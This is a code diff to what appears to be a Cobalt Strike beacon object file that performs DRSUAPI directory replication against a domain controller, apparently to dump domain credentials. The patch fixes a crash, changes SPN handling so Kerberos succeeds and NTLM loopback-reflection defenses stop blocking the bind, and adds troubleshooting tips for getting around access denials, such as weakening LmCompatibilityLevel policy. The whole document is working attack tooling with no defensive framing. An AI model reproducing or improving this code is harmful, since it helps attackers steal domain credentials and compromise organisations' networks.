@@ -422,7 +422,11 @@ static RPC_STATUS rpc_call(RPC_BINDING_HANDLE hBind, DWORD opnum,
     s = RPCRT4$I_RpcSendReceive(msg);
     BeaconPrintf(CALLBACK_OUTPUT,
         "[.] trace:   s=0x%08x replyLen=%u\n", s, msg->BufferLength);
-    if (s) { RPCRT4$I_RpcFreeBuffer(msg); return s; }
+    /* Do NOT call I_RpcFreeBuffer on failure — the RPC runtime already
+     * released the request/response buffers when it returned the error,
+     * and freeing again walks into freed memory: the ret from rpc_call
+     * pops a zero into RIP and we crash-at-address-0. Just propagate. */
+    if (s) return s;
     return 0;
 }
 
@@ -473,6 +477,25 @@ static int drsr_bind(RPC_BINDING_HANDLE hRpc, BYTE ctxHandle[20])
     RPC_STATUS s = rpc_call(hRpc, DRSR_OPNUM_BIND, req, p, &msg);
     if (s) {
         BeaconPrintf(CALLBACK_ERROR, "[!] DRSBind RPC failed: 0x%08x\n", s);
+        if (s == 5) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!]   0x5 = RPC_S_ACCESS_DENIED. Common causes:\n"
+                "[!]     - Caller lacks DS-Replication-Get-Changes on the domain NC\n"
+                "[!]       (not a Domain Admin / Enterprise Admin / DCs member)\n"
+                "[!]     - Kerberos SPN could not be resolved so SSPI fell back\n"
+                "[!]       to NTLM; NTLM against the local LSA is refused by the\n"
+                "[!]       loopback-reflection defense when the agent runs on\n"
+                "[!]       the target DC itself. Fix: run from a member host, or\n"
+                "[!]       set LmCompatibilityLevel policy to allow, or use ncalrpc\n"
+                "[!]     - The named pipe \\pipe\\lsass rejected the auth level\n"
+                "[!]       (rare — needs PKT_PRIVACY, which we do set)\n");
+        } else if (s == 1753) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!]   0x6D9 = EPT_S_NOT_REGISTERED. DRSUAPI not exposed here.\n");
+        } else if (s == 1722) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!]   0x6BA = RPC_S_SERVER_UNAVAILABLE. Pipe/host unreachable.\n");
+        }
         return 0;
     }
 
@@ -1288,9 +1311,17 @@ void go(char *args, int args_len)
         /* PKT_PRIVACY + GSS_NEGOTIATE — required by DRSUAPI's ACL.
          * Any lower auth level makes the interface look "unknown" to
          * the caller (Windows hides it rather than returning
-         * ACCESS_DENIED on the bind). */
+         * ACCESS_DENIED on the bind).
+         *
+         * ServerPrincName = NULL: let the RPC runtime auto-derive the
+         * SPN from the binding's target hostname. Passing a bare host
+         * name (aDC) here made SSPI unable to acquire a Kerberos
+         * service ticket, so it fell back to NTLM — and NTLM against
+         * the LOCAL LSA (agent running on the target DC itself) is
+         * rejected by the loopback-reflection defense, which is the
+         * RPC_S_ACCESS_DENIED (0x5) we were seeing at DRSBind. */
         BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcBindingSetAuthInfoExA\n");
-        rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, (RPC_CSTR)aDC,
+        rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, NULL,
             RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE,
             NULL, 0, NULL);
         BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
